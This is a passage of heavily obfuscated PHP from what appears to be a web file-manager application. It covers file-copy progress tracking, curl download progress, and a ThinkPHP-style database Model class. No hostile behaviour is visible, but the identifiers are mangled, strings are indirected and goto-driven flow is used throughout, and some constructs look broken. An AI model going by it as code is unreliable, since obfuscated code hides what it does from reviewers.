$å­¼÷©ï[$õçÅ¶çÌ[1138]] += 1; } else { $å­¼÷©ï[$õçÅ¶çÌ[1138]] += $†Š…Âæú[$õçÅ¶çÌ[82]][$õçÅ¶çÌ[80]]; if ($†Š…Âæú[$õçÅ¶çÌ[193]]) { $å­¼÷©ï[$õçÅ¶çÌ[1138]] += $†Š…Âæú[$õçÅ¶çÌ[82]][$õçÅ¶çÌ[81]] + 1; } } $å­¼÷©ï[$õçÅ¶çÌ[838]] += $†Š…Âæú[$õçÅ¶çÌ[79]]; $this->update(); } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddHashStart($ñ°ĞÜ¼’) { } public function sourceAddHashEnd($È×ÖäàŞ) { } public function sourceAddFileStart($ßáØ„ˆÙ) { $Ç¡ÉüƒÇ =& $_SERVER[³Ôà×Ó]; $òıòÛÊ• =& $this->task; $òıòÛÊ•[$Ç¡ÉüƒÇ[1818]] = $ßáØ„ˆÙ[$Ç¡ÉüƒÇ[79]]; $òıòÛÊ•[$Ç¡ÉüƒÇ[1816]] = $ßáØ„ˆÙ[$Ç¡ÉüƒÇ[32]]; $òıòÛÊ•[$Ç¡ÉüƒÇ[1140]] = $ßáØ„ˆÙ[$Ç¡ÉüƒÇ[32]]; $òıòÛÊ•[$Ç¡ÉüƒÇ[1829]] = $ßáØ„ˆÙ[$Ç¡ÉüƒÇ[87]]; $this->update(); } public function sourceAddFileEnd($ÇšÚÕİÄ) { $Î“¸Š  =& $_SERVER[³Ôà×Ó]; $’ú›£’˜ =& $this->task; $’ú›£’˜[$Î“¸Š [1823]] += $ÇšÚÕİÄ[$Î“¸Š [79]]; $’ú›£’˜[$Î“¸Š [1829]] = $ÇšÚÕİÄ[$Î“¸Š [87]]; $this->update(1); } public function copyFileStart($êÜ¦Ò°ö, $´«¶ûÒ‡, $Ì÷‰íƒ, $¦Ù‹Ô, $¬õñø¬’, $¼¥ï…‡ß) { $º‰÷âÜÏ =& $_SERVER[³Ôà×Ó]; $œÇ²Œ¬ã = $¬õñø¬’; if ($œÇ²Œ¬ã == $GLOBALS[$º‰÷âÜÏ[1830]]) { $œÇ²Œ¬ã = $GLOBALS[$º‰÷âÜÏ[1831]]; } $GLOBALS[$º‰÷âÜÏ[1831]] = $¬õñø¬’; $GLOBALS[$º‰÷âÜÏ[1830]] = $¼¥ï…‡ß; $¸·„ÒÑ¢ =& $this->task; $¸·„ÒÑ¢[$º‰÷âÜÏ[1816]] = $œÇ²Œ¬ã; $¸·„ÒÑ¢[$º‰÷âÜÏ[1818]] = (int) $êÜ¦Ò°ö->size($´«¶ûÒ‡); $¸·„ÒÑ¢[$º‰÷âÜÏ[1819]] = 0; $¸·„ÒÑ¢[$º‰÷âÜÏ[1140]] = $º‰÷âÜÏ[12]; $¸·„ÒÑ¢[$º‰÷âÜÏ[1820]] = $º‰÷âÜÏ[12]; $¸·„ÒÑ¢[$º‰÷âÜÏ[1821]] = 0; $¹ôú¨·ˆ = $¸·„ÒÑ¢[$º‰÷âÜÏ[1818]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($¸·„ÒÑ¢[$º‰÷âÜÏ[484]] . $º‰÷âÜÏ[1832]); if ($¹ôú¨·ˆ && file_exists(get_path_father($¦Ù‹Ô))) { Cache::set($¸·„ÒÑ¢[$º‰÷âÜÏ[484]] . $º‰÷âÜÏ[1832], $¦Ù‹Ô); $¸·„ÒÑ¢[$º‰÷âÜÏ[1789]] = array($º‰÷âÜÏ[1833], $º‰÷âÜÏ[1834]); } $this->update(0, $¹ôú¨·ˆ); } public static function updateCopyLocalFileSize($‹Üı«ÔÓ) { $—ÁËÂáá =& $_SERVER[³Ôà×Ó]; $Õ¦Åœ˜” = Cache::get($‹Üı«ÔÓ[$—ÁËÂáá[484]] . $—ÁËÂáá[1832]); if (!$Õ¦Åœ˜” || !file_exists($Õ¦Åœ˜”)) { return $‹Üı«ÔÓ; } $‹Üı«ÔÓ[$—ÁËÂáá[1819]] = @filesize($Õ¦Åœ˜”); $‹Üı«ÔÓ[$—ÁËÂáá[1823]] += $‹Üı«ÔÓ[$—ÁËÂáá[1819]]; self::updateTask($‹Üı«ÔÓ); return $‹Üı«ÔÓ; } public function copyFileEnd($–ş´Ü, $”õ²‡›î, $ÀÙÏºö‡, $¨ö®Ê„ü, $·ÕÎ¡¢Ş, $íÏ’›È) { $‹à²¡¿× =& $_SERVER[³Ôà×Ó]; $ñº¸Æ–£ =& $this->task; $ñº¸Æ–£[$‹à²¡¿×[1819]] = $ñº¸Æ–£[$‹à²¡¿×[1818]]; $ñº¸Æ–£[$‹à²¡¿×[1820]] = $‹à²¡¿×[12]; unset($ñº¸Æ–£[$‹à²¡¿×[1789]]); if ($·ÕÎ¡¢Ş == $ñº¸Æ–£[$‹à²¡¿×[1816]]) { $ñº¸Æ–£[$‹à²¡¿×[1822]] += $ñº¸Æ–£[$‹à²¡¿×[1818]]; $ñº¸Æ–£[$‹à²¡¿×[1823]] = $ñº¸Æ–£[$‹à²¡¿×[1822]]; $ÆÅ€»„… = 1; if (isset($ñº¸Æ–£[$‹à²¡¿×[1829]]) && $ñº¸Æ–£[$‹à²¡¿×[1829]] == $”õ²‡›î) { $ÆÅ€»„… = 0; } $this->update($ÆÅ€»„…); } else { $this->update(); $ñº¸Æ–£[$‹à²¡¿×[1819]] = 0; } Cache::remove($ñº¸Æ–£[$‹à²¡¿×[484]] . $‹à²¡¿×[1832]); self::log($‹à²¡¿×[1835] . $”õ²‡›î . $‹à²¡¿×[73] . $¨ö®Ê„ü . $‹à²¡¿×[262] . $·ÕÎ¡¢Ş . $‹à²¡¿×[1836] . $ñº¸Æ–£[$‹à²¡¿×[1816]]); } public function updateFileEnd($È°Èú‡´, $ÃÚŠó„) { $îú•Ñß“ =& $_SERVER[³Ôà×Ó]; $€§§Ö‹Ğ =& $this->task; $€§§Ö‹Ğ[$îú•Ñß“[1816]] = $È°Èú‡´; $€§§Ö‹Ğ[$îú•Ñß“[1818]] = $ÃÚŠó„; $€§§Ö‹Ğ[$îú•Ñß“[1822]] += $ÃÚŠó„; $€§§Ö‹Ğ[$îú•Ñß“[1823]] = $€§§Ö‹Ğ[$îú•Ñß“[1822]]; $this->update(1); self::log($îú•Ñß“[1837] . $È°Èú‡´); } public function sourceModelCopy($ÎØœô) { $¸¡¶¡Â =& $_SERVER[³Ôà×Ó]; $¨™ïûİ« = $ÎØœô[0]; $Ê¬¹Æº™ = $ÎØœô[1]; $ø©´Àüº =& $this->task; $this->sourceModelCopyFlag = !0; $ğÀ€È´¥ = 0; switch ($¨™ïûİ«) { case $¸¡¶¡Â[644]: $ğÀ€È´¥ = 1; break; case $¸¡¶¡Â[647]: $ø©´Àüº[$¸¡¶¡Â[1816]] = $Ê¬¹Æº™[$¸¡¶¡Â[32]]; break; case $¸¡¶¡Â[649]: $ğÀ€È´¥ = intval($ÎØœô[$¸¡¶¡Â[465]] * 0.4); break; case $¸¡¶¡Â[651]: $ğÀ€È´¥ = intval($ÎØœô[$¸¡¶¡Â[465]] * 0.2); break; case $¸¡¶¡Â[653]: $ğÀ€È´¥ = intval($ÎØœô[$¸¡¶¡Â[465]] * 0.4); break; } $this->update($ğÀ€È´¥); $this->sourceModelCopyFlag = !1; } public function sourceRemove($½”¤ôæš, $éÅˆüÇ™) { $ÌìÈµĞù =& $_SERVER[³Ôà×Ó]; $this->sourceModelCopyFlag = !0; $ŞÒ†²¡Œ = 1; if (isset($½”¤ôæš[$ÌìÈµĞù[82]])) { $ŞÒ†²¡Œ = $½”¤ôæš[$ÌìÈµĞù[82]][$ÌìÈµĞù[80]]; $ŞÒ†²¡Œ = $ŞÒ†²¡Œ + $½”¤ôæš[$ÌìÈµĞù[82]][$ÌìÈµĞù[81]] + 1; } $this->update($ŞÒ†²¡Œ); $this->sourceModelCopyFlag = !1; } public function sourceMove($Ì¾îË¤) { $this->sourceRemove($Ì¾îË¤, !1); } public function curlProgress($è—·‚¬, $ÕÄş©×Ì, $ãò„ˆÈû, $‰µºËêó, $å‡ßï) { $÷›×¡Îé =& $_SERVER[³Ôà×Ó]; $°ÉÈ²¦ì =& $this->task; if ($å‡ßï > 0) { $°ÉÈ²¦ì[$÷›×¡Îé[1140]] = $÷›×¡Îé[1838]; $°ÉÈ²¦ì[$÷›×¡Îé[1820]] = $÷›×¡Îé[110]; if ($°ÉÈ²¦ì[$÷›×¡Îé[1818]]) { $°ÉÈ²¦ì[$÷›×¡Îé[1819]] = $å‡ßï; } if ($°ÉÈ²¦ì[$÷›×¡Îé[1821]]) { $°ÉÈ²¦ì[$÷›×¡Îé[1819]] = $å‡ßï + $°ÉÈ²¦ì[$÷›×¡Îé[1821]]; } } else { if ($ãò„ˆÈû > 0) { if ($°ÉÈ²¦ì[$÷›×¡Îé[1818]] == $ÕÄş©×Ì) { $°ÉÈ²¦ì[$÷›×¡Îé[1819]] = $ãò„ˆÈû; $°ÉÈ²¦ì[$÷›×¡Îé[1140]] = $÷›×¡Îé[1839]; $°ÉÈ²¦ì[$÷›×¡Îé[1820]] = $÷›×¡Îé[1276]; } } } $this->update(); } public function curlProgressStart($·Ğªœ››) { } public function curlProgressEnd($¬Î½¶³ß) { $İ€ôßöÔ =& $_SERVER[³Ôà×Ó]; $ÇàÂÜ­Ø =& $this->task; $‹¬¢Ä× = curl_getinfo($¬Î½¶³ß); $’á®ß = $‹¬¢Ä×[$İ€ôßöÔ[1840]]; if ($’á®ß == -1) { $’á®ß = $‹¬¢Ä×[$İ€ôßöÔ[1841]]; } if ($ÇàÂÜ­Ø[$İ€ôßöÔ[1820]] == $İ€ôßöÔ[110] && $’á®ß) { $ÇàÂÜ­Ø[$İ€ôßöÔ[1821]] += $’á®ß; } $this->update(); } } goto dˆŸÍå¬¨; B»»‚õÈÙÀ: function binCheckBigger($Ô¸ıïí¬, $Öë¶ûÓ) { return $Ô¸ıïí¬ > $Öë¶ûÓ; } $_SERVER[$_SERVER[¿¨Â¬][3]] = ("\70\65\60\60".strrev('55'))+0;$_dt03="i4hx5o2gqfvnmbldk8190twzyap7jeus63crxhl9cd82y7gtjebw4aznuk0m135vqorifps69bk3qw";; class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($ú€‚›é·, $ŸêşıÖ) { $êê´Á­ =& $_SERVER[³Ôà×Ó]; if (isset(self::$_methodList[$ú€‚›é·])) { return @call_user_func_array(self::$_methodList[$ú€‚›é·], $ŸêşıÖ); } else { if (method_exists($this, $ú€‚›é·)) { return call_user_func_array(array($this, $ú€‚›é·), $ŸêşıÖ); } else { think_exception(__CLASS__ . $êê´Á­[4] . $ú€‚›é· . $êê´Á­[5]); } } } public static function __callStatic($ÛİìŸŠ†, $”ôˆ¿¹ä) { if (isset(self::$_methodListStatic[$ÛİìŸŠ†])) { return call_user_func_array(self::$_methodListStatic[$ÛİìŸŠ†], $”ôˆ¿¹ä); } else { if (method_exists(self, $ÛİìŸŠ†)) { return call_user_func_array(array(self, $ÛİìŸŠ†), $”ôˆ¿¹ä); } else { show_json("{$ÛİìŸŠ†}\x28\51\40\x6e\157\164\40\145\x78\x69\x73\x74\x3b", !1); } } } public static function addMethod($µÊŸ”¸, $ä•¹ †) { self::$_methodList[$µÊŸ”¸] = $ä•¹ †; } public static function addMethodStatic($ÒüôÒØ, $öß¯ˆÏ) { self::$_methodListStatic[$ÒüôÒØ] = $öß¯ˆÏ; } } goto fÈ½°—„ƒø; ağ»õ…·åŞ: define($_SERVER[³Ôà×Ó][320], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\x69\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\x62\154\x65", "\157\162\x64\145\x72", "\x61\x6c\151\141\163", "\x68\x61\x76\151\156\147", "\x67\162\157\165\160", "\154\157\x63\153", "\144\151\163\x74\151\x6e\143\x74", "\141\x75\164\x6f", "\x66\151\154\x74\145\x72", "\x76\x61\154\x69\144\141\x74\x65", "\x72\x65\x73\165\x6c\x74", "\142\x69\156\144", "\164\157\153\x65\156"); public function __construct($ïßëäî… = '', $ƒŞù«Èï = '', $¸Áâ€¸Ò = '') { $õñ¿Âáä =& $_SERVER[³Ôà×Ó]; $this->_initialize(); if (!empty($ïßëäî…)) { if (strpos($ïßëäî…, $õñ¿Âáä[10])) { list($this->dbName, $this->name) = explode($õñ¿Âáä[10], $ïßëäî…); } else { $this->name = $ïßëäî…; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($ƒŞù«Èï)) { $this->tablePrefix = $õñ¿Âáä[12]; } elseif ($õñ¿Âáä[12] != $ƒŞù«Èï) { $this->tablePrefix = $ƒŞù«Èï; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($õñ¿Âáä[321]); } $this->db(0, empty($this->connection) ? $¸Áâ€¸Ò : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $À±ãßæõ =& $_SERVER[³Ôà×Ó]; if (empty($this->fields)) { if (think_config($À±ãßæõ[322])) { $´‘©Şº• = $this->dbName ? $this->dbName : think_config($À±ãßæõ[323]); $ÔÁÁ‘Ì = think_var_cache($À±ãßæõ[324] . strtolower(get_path_this($´‘©Şº•) . $À±ãßæõ[10] . $this->name)); if ($ÔÁÁ‘Ì) { $­ì•¤· = think_config($À±ãßæõ[325]); if (empty($­ì•¤·) || $ÔÁÁ‘Ì[$À±ãßæõ[326]] == $­ì•¤·) { $this->fields = $ÔÁÁ‘Ì; return; } } } $this->flush(); } } public function flush() { $‡Òˆõ“ =& $_SERVER[³Ôà×Ó]; $this->db->setModel($this->name); $½ŸÒÍ¾Ğ = $this->db->getFields($this->getTableName()); if (!$½ŸÒÍ¾Ğ) { return !1; } $this->fields = array_keys($½ŸÒÍ¾Ğ); $this->fields[$‡Òˆõ“[327]] = !1; foreach ($½ŸÒÍ¾Ğ as $ı¢ÂŸÒÆ => $ÎÎğ¼ú) { $ŒˆçÆç‹[$ı¢ÂŸÒÆ] = $ÎÎğ¼ú[$‡Òˆõ“[33]]; if ($ÎÎğ¼ú[$‡Òˆõ“[39]]) { $this->fields[$‡Òˆõ“[328]] = $ı¢ÂŸÒÆ; if ($ÎÎğ¼ú[$‡Òˆõ“[42]]) { $this->fields[$‡Òˆõ“[327]] = !0; } } } $this->fields[$‡Òˆõ“[329]] = $ŒˆçÆç‹; if (think_config($‡Òˆõ“[325])) { $this->fields[$‡Òˆõ“[326]] = think_config($‡Òˆõ“[325]); } if (think_config($‡Òˆõ“[322])) { $à¯÷‚˜­ = $this->dbName ? $this->dbName : think_config($‡Òˆõ“[323]); think_var_cache($‡Òˆõ“[324] . strtolower(get_path_this($à¯÷‚˜­) . $‡Òˆõ“[10] . $this->name), $this->fields); } } public function switchModel($Ñ­Í‚ŞÁ, $˜ÊÅˆ”Ï = array()) { $½íäáÛ =& $_SERVER[³Ôà×Ó]; $›‹Õâœ£ = ucwords(strtolower($Ñ­Í‚ŞÁ)) . $½íäáÛ[330]; if (!class_exists($›‹Õâœ£)) { think_exception($›‹Õâœ£ . think_lang($½íäáÛ[331])); } $this->_extModel = new $›‹Õâœ£($this->name); if (!empty($˜ÊÅˆ”Ï)) { foreach ($˜ÊÅˆ”Ï as $¬›ú´È¸) { $this->_extModel->setProperty($¬›ú´È¸, $this->{$¬›ú´È¸}); } } return $this->_extModel; } public function __set($ÕŸÍ¬™, $şíÜÜÈÚ) { $this->data[$ÕŸÍ¬™] = $şíÜÜÈÚ; } public function __get($Òş‰¨ñ·) { return isset($this->data[$Òş‰¨ñ·]) ? $this->data[$Òş‰¨ñ·] : null; } public function __isset($€–¼Üµ†) { return isset($this->data[$€–¼Üµ†]); } public function __unset($¶ä’ë‰Œ) { unset($this->data[$¶ä’ë‰Œ]); } public function __call($¯¯Û°Àµ, $¡“«üÚ‚) { $×“Ì­Ç =& $_SERVER[³Ôà×Ó]; if (in_array(strtolower($¯¯Û°Àµ), $this->methods, !0)) { $this->options[strtolower($¯¯Û°Àµ)] = $¡“«üÚ‚[0]; return $this; } elseif (in_array(strtolower($¯¯Û°Àµ), array($×“Ì­Ç[332], $×“Ì­Ç[333], $×“Ì­Ç[334], $×“Ì­Ç[335], $×“Ì­Ç[336]), !0)) { $†¾ÙÍŸ = isset($¡“«üÚ‚[0]) ? $¡“«üÚ‚[0] : $×“Ì­Ç[220]; $†¾ÙÍŸ = $this->db->parseKey($†¾ÙÍŸ); return $this->getField(strtoupper($¯¯Û°Àµ) . $×“Ì­Ç[337] . $†¾ÙÍŸ . $×“Ì­Ç[338] . $¯¯Û°Àµ, $×“Ì­Ç[332]); } elseif (strtolower(substr($¯¯Û°Àµ, 0, 5)) == $×“Ì­Ç[339]) { $†¾ÙÍŸ = think_parse_name(substr($¯¯Û°Àµ, 5)); $î€¹ìê±[$†¾ÙÍŸ] = $¡“«üÚ‚[0]; return $this->where($î€¹ìê±)->find(); } elseif (strtolower(substr($¯¯Û°Àµ, 0, 10)) == $×“Ì­Ç[340]) { $ÛêÁ²°´ = think_parse_name(substr($¯¯Û°Àµ, 10)); $î€¹ìê±[$ÛêÁ²°´] = $¡“«üÚ‚[0]; return $this->where($î€¹ìê±)->getField($¡“«üÚ‚[1]); } elseif (isset($this->_scope[$¯¯Û°Àµ])) { return $this->scope($¯¯Û°Àµ, $¡“«üÚ‚[0]); } elseif (method_exists($this, $¯¯Û°Àµ)) { array_unshift($¡“«üÚ‚, $¯¯Û°Àµ); return call_user_func_array(array($this, $×“Ì­Ç[341]), $¡“«üÚ‚); } else { return call_user_func_array(array(parent, $¯¯Û°Àµ), $¡“«üÚ‚); } } protected function call() { $Îİµúó =& $_SERVER[³Ôà×Ó]; $Ø†ùû¯¤ = func_get_args(); $µ´†òõ³ = array_shift($Ø†ùû¯¤); $Ö¬†¹ß = $µ´†òõ³; if (is_array($µ´†òõ³)) { $Ö¬†¹ß = $µ´†òõ³[1]; $µ´†òõ³ = $µ´†òõ³[0]; } $Çì ‚É´ = count($Ø†ùû¯¤) - 1; if (isset($Ø†ùû¯¤[$Çì ‚É´]) && $Ø†ùû¯¤[$Çì ‚É´] === $µ´†òõ³) { think_exception(__CLASS__ . $Îİµúó[4] . $µ´†òõ³ . think_lang($Îİµúó[342])); return; } $Ø†ùû¯¤[] = $µ´†òõ³; if (method_exists($this, $Îİµúó[343])) { $¾ªõ Ğ« = call_user_func_array(array($this, $Îİµúó[344]), array($Ö¬†¹ß, $Ø†ùû¯¤)); if (!is_null($¾ªõ Ğ«) && $¾ªõ Ğ« !== !1) { return $¾ªõ Ğ«; } } $ñŒˆìŸ = call_user_func_array(array($this, $µ´†òõ³), $Ø†ùû¯¤); if (method_exists($this, $Îİµúó[345])) { $¾ªõ Ğ« = call_user_func_array(array($this, $Îİµúó[346]), array($Ö¬†¹ß, $Ø†ùû¯¤, $ñŒˆìŸ)); if ($¾ªõ Ğ«) { return $¾ªõ Ğ«; } } return $ñŒˆìŸ; } protected function _initialize() { } protected function _facade($Ç¯¦Àµı) { $í÷Ë¤›ğ =& $_SERVER[³Ôà×Ó]; if (!empty($this->fields)) { foreach ($Ç¯¦Àµı as $“ŠÃæ¦© => $ÅÁ¹¥ò) { if (is_array($this->fields) && !in_array($“ŠÃæ¦©, $this->fields, !0)) { unset($Ç¯¦Àµı[$“ŠÃæ¦©]); } elseif (is_scalar($ÅÁ¹¥ò)) { $this->_parseType($Ç¯¦Àµı, $“ŠÃæ¦©); } } } if (!empty($this->options[$í÷Ë¤›ğ[347]])) { $Ç¯¦Àµı = array_map($this->options[$í÷Ë¤›ğ[347]], $Ç¯¦Àµı); unset($this->options[$í÷Ë¤›ğ[347]]); } $this->_beforeWrite($Ç¯¦Àµı); return $Ç¯¦Àµı; } protected function _beforeWrite(&$Úøı©ö ) { } public function add($ŠïŒº = '', $·ÂŠ½Ì = array(), $çÈâÙòî = false) { if (empty($ŠïŒº)) { if (!empty($this->data)) { $ŠïŒº = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[³Ôà×Ó][348]); return !1; } } $·ÂŠ½Ì = $this->_parseOptions($·ÂŠ½Ì); $ŠïŒº = $this->_facade($ŠïŒº); if (!1 === $this->_beforeInsert($ŠïŒº, $·ÂŠ½Ì)) { return !1; } $ŸûïĞ = $this->db->insert($ŠïŒº, $·ÂŠ½Ì, $çÈâÙòî); if (!1 !== $ŸûïĞ) { $ÆÇÜ†Ì = $this->getLastInsID(); if ($ÆÇÜ†Ì) { $ŠïŒº[$this->getPk()] = $ÆÇÜ†Ì; $this->_after_insert($ŠïŒº, $·ÂŠ½Ì); return $ÆÇÜ†Ì; } $this->_after_insert($ŠïŒº, $·ÂŠ½Ì); } return $ŸûïĞ; } protected function _beforeInsert(&$İ·òØò¢, $àéáØºì) { } protected function _after_insert($Í¯©ïí, $ñåÍ²ƒ ) { } public function addAll($µò†¤âÇ, $»í»€¯ = array(), $¸Î³ªÃç = false) { $î’¡©ÙÅ =& $_SERVER[³Ôà×Ó]; if (empty($µò†¤âÇ)) { $this->error = think_lang($î’¡©ÙÅ[348]); return !1; } $»í»€¯ = $this->_parseOptions($»í»€¯); foreach ($µò†¤âÇ as $»±Á±¤Ÿ => $´˜åçğ) { $µò†¤âÇ[$»±Á±¤Ÿ] = $this->_facade($´˜åçğ); } if (method_exists($this->db, $î’¡©ÙÅ[349])) { $ã³…©“ = $this->db->insertAll($µò†¤âÇ, $»í»€¯, $¸Î³ªÃç); } else { $this->startTrans(); foreach ($µò†¤âÇ as $»±Á±¤Ÿ => $´˜åçğ) { $ã³…©“ = $this->db->insert($´˜åçğ, $»í»€¯, $¸Î³ªÃç); } $this->commit(); } if (!1 !== $ã³…©“) { $äÌ™¬è’ = $this->getLastInsID(); if ($äÌ™¬è’) { return $äÌ™¬è’; } } return $ã³…©“; } public function selectAdd($‰§çä–Å = '', $äµ¥¾À = '', $Í‹ˆü¨ó = array()) { $Î˜¢ã³ =& $_SERVER[³Ôà×Ó]; $Í‹ˆü¨ó = $this->_parseOptions($Í‹ˆü¨ó); if (!1 === ($İÊƒõÉ— = $this->db->selectInsert($‰§çä–Å ? $‰§çä–Å : $Í‹ˆü¨ó[$Î˜¢ã³[350]], $äµ¥¾À ? $äµ¥¾À : $this->getTableName(), $Í‹ˆü¨ó))) { $this->error = think_lang($Î˜¢ã³[351]); return !1; } else { return $İÊƒõÉ—; } } public function save($”ŞÜÅäÒ = '', $ô¹Š×òé = array()) { $¯üéàçó =& $_SERVER[³Ôà×Ó]; if (empty($”ŞÜÅäÒ)) { if (!empty($this->data)) { $”ŞÜÅäÒ = $this->data; $this->data = array(); } else { $this->error = think_lang($¯üéàçó[348]); return !1; } } $”ŞÜÅäÒ = $this->_facade($”ŞÜÅäÒ); $ô¹Š×òé = $this->_parseOptions($ô¹Š×òé); $ïü‘ü“ª = $this->getPk(); if (!isset($ô¹Š×òé[$¯üéàçó[352]])) { if (isset($”ŞÜÅäÒ[$ïü‘ü“ª])) { $ÖÁ‰¥É[$ïü‘ü“ª] = $”ŞÜÅäÒ[$ïü‘ü“ª]; $ô¹Š×òé[$¯üéàçó[352]] = $ÖÁ‰¥É; unset($”ŞÜÅäÒ[$ïü‘ü“ª]); } else { $this->error = think_lang($¯üéàçó[351]); return !1; } } if (is_array($ô¹Š×òé[$¯üéàçó[352]]) && isset($ô¹Š×òé[$¯üéàçó[352]][$ïü‘ü“ª])) { $Ú°áˆÈ² = $ô¹Š×òé[$¯üéàçó[352]][$ïü‘ü“ª]; } if (!1 === $this->_beforeUpdate($”ŞÜÅäÒ, $ô¹Š×òé)) { return !1; } $´º×£™ = $this->db->update($”ŞÜÅäÒ, $ô¹Š×òé); if (!1 !== $´º×£™) { if (isset($Ú°áˆÈ²)) { $”ŞÜÅäÒ[$ïü‘ü“ª] = $Ú°áˆÈ²; } $this->_afterUpdate($”ŞÜÅäÒ, $ô¹Š×òé); } return $´º×£™; } protected function _beforeUpdate(&$‡ıñ­„í, $“¦’Üû) { } protected function _afterUpdate($®‚‡õÖ¬, $Ô†Ö£¿æ) { } public function delete($âÜ¾˜„… = array()) { $åÑŠˆ§ =& $_SERVER[³Ôà×Ó]; if (empty($âÜ¾˜„…) && empty($this->options[$åÑŠˆ§[352]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Ì€øÜ‘‰ = $this->getPk(); if (is_numeric($âÜ¾˜„…) || is_string($âÜ¾˜„…)) { if (strpos($âÜ¾˜„…, $åÑŠˆ§[50])) { $ƒÆñºÔ¿[$Ì€øÜ‘‰] = array($åÑŠˆ§[353], $âÜ¾˜„…); } else { $ƒÆñºÔ¿[$Ì€øÜ‘‰] = $âÜ¾˜„…; } $this->options[$åÑŠˆ§[352]] = $ƒÆñºÔ¿; } $âÜ¾˜„… = $this->_parseOptions(); if (is_array($âÜ¾˜„…[$åÑŠˆ§[352]]) && isset($âÜ¾˜„…[$åÑŠˆ§[352]][$Ì€øÜ‘‰])) { $ö›¥½õ– = $âÜ¾˜„…[$åÑŠˆ§[352]][$Ì€øÜ‘‰]; } $Ú»Àí•÷ = $this->db->delete($âÜ¾˜„…); if (!1 !== $Ú»Àí•÷) { $„à†®ÇÕ = array(); if (isset($ö›¥½õ–)) { $„à†®ÇÕ[$Ì€øÜ‘‰] = $ö›¥½õ–; } $this->_after_delete($„à†®ÇÕ, $âÜ¾˜„…); } return $Ú»Àí•÷; } protected function _after_delete($Éø‘Çû, $âõå»ëÙ) { } public function select($íìÎÔ–« = array()) { $ªæÁØ®“ =& $_SERVER[³Ôà×Ó]; if (is_string($íìÎÔ–«) || is_numeric($íìÎÔ–«)) { $ÊÇÏÎÔ = $this->getPk(); if (strpos($íìÎÔ–«, $ªæÁØ®“[50])) { $–Õ¤”Ù[$ÊÇÏÎÔ] = array($ªæÁØ®“[353], $íìÎÔ–«); } else { $–Õ¤”Ù[$ÊÇÏÎÔ] = $íìÎÔ–«; } $this->options[$ªæÁØ®“[352]] = $–Õ¤”Ù; } elseif (!1 === $íìÎÔ–«) { $íìÎÔ–« = $this->_parseOptions(); return $ªæÁØ®“[354] . $this->db->buildSelectSql($íìÎÔ–«) . $ªæÁØ®“[355]; } $íìÎÔ–« = $this->_parseOptions(); $ûû¡»…• = $this->db->select($íìÎÔ–«); if (!1 === $ûû¡»…•) { return !1; } if (empty($ûû¡»…•)) { return null; } $this->_afterSelect($ûû¡»…•, $íìÎÔ–«); return $ûû¡»…•; } protected function _afterSelect(&$É¹ÂÊáí, $Äò©¥¼ø) { } public function buildSql($ô¥œığ· = array()) { $é¦±³çÚ =& $_SERVER[³Ôà×Ó]; $ô¥œığ· = $this->_parseOptions($ô¥œığ·); return $é¦±³çÚ[354] . $this->db->buildSelectSql($ô¥œığ·) . $é¦±³çÚ[355]; } public function optionsValue($¹Ü”–ÓÅ = null) { if (is_null($¹Ü”–ÓÅ)) { return $this->options; } elseif (is_array($¹Ü”–ÓÅ)) { $this->options = array_merge($this->options, $¹Ü”–ÓÅ); } } protected function _parseOptions($¹Í©æØ = array()) { $àé‰ìèã =& $_SERVER[³Ôà×Ó]; if (is_array($¹Í©æØ)) { $¹Í©æØ = array_merge($this->options, $¹Í©æØ); } $this->options = array(); if (!isset($¹Í©æØ[$àé‰ìèã[356]])) { $¹Í©æØ[$àé‰ìèã[356]] = $this->getTableName(); $´—À–œÄ = $this->fields; } else { $´—À–œÄ = $this->getDbFields(); } if (!empty($¹Í©æØ[$àé‰ìèã[357]])) { $¹Í©æØ[$àé‰ìèã[356]] .= $àé‰ìèã[53] . $¹Í©æØ[$àé‰ìèã[357]]; } $¹Í©æØ[$àé‰ìèã[358]] = $this->name; if (isset($¹Í©æØ[$àé‰ìèã[352]]) && is_array($¹Í©æØ[$àé‰ìèã[352]]) && !empty($´—À–œÄ) && !isset($¹Í©æØ[$àé‰ìèã[359]]) && !isset($¹Í©æØ[$àé‰ìèã[356]])) { foreach ($¹Í©æØ[$àé‰ìèã[352]] as $îä‹çêş => $ÎŠÓ‚ä) { $îä‹çêş = trim($îä‹çêş); if (in_array($îä‹çêş, $´—À–œÄ, !0)) { if (is_scalar($ÎŠÓ‚ä)) { $this->_parseType($¹Í©æØ[$àé‰ìèã[352]], $îä‹çêş); } } elseif (!is_numeric($îä‹çêş) && $àé‰ìèã[11] != substr($îä‹çêş, 0, 1) && !1 === strpos($îä‹çêş, $àé‰ìèã[10]) && !1 === strpos($îä‹çêş, $àé‰ìèã[337]) && !1 === strpos($îä‹çêş, $àé‰ìèã[214]) && !1 === strpos($îä‹çêş, $àé‰ìèã[360])) { unset($¹Í©æØ[$àé‰ìèã[352]][$îä‹çêş]); } } } $this->_options_filter($¹Í©æØ); return $¹Í©æØ; } protected function _options_filter(&$ğÉäçû) { } protected function _parseType(&$¥ŒìøËú, $ƒì£†âö) { $à¾Ì¾†Ì =& $_SERVER[³Ôà×Ó]; if (empty($this->options[$à¾Ì¾†Ì[361]][$à¾Ì¾†Ì[4] . $ƒì£†âö])) { $¢ìÂéãÈ = strtolower($this->fields[$à¾Ì¾†Ì[329]][$ƒì£†âö]); if (!1 !== strpos($¢ìÂéãÈ, $à¾Ì¾†Ì[362])) { } elseif (!1 === strpos($¢ìÂéãÈ, $à¾Ì¾†Ì[363]) && !1 !== strpos($¢ìÂéãÈ, $à¾Ì¾†Ì[364])) { 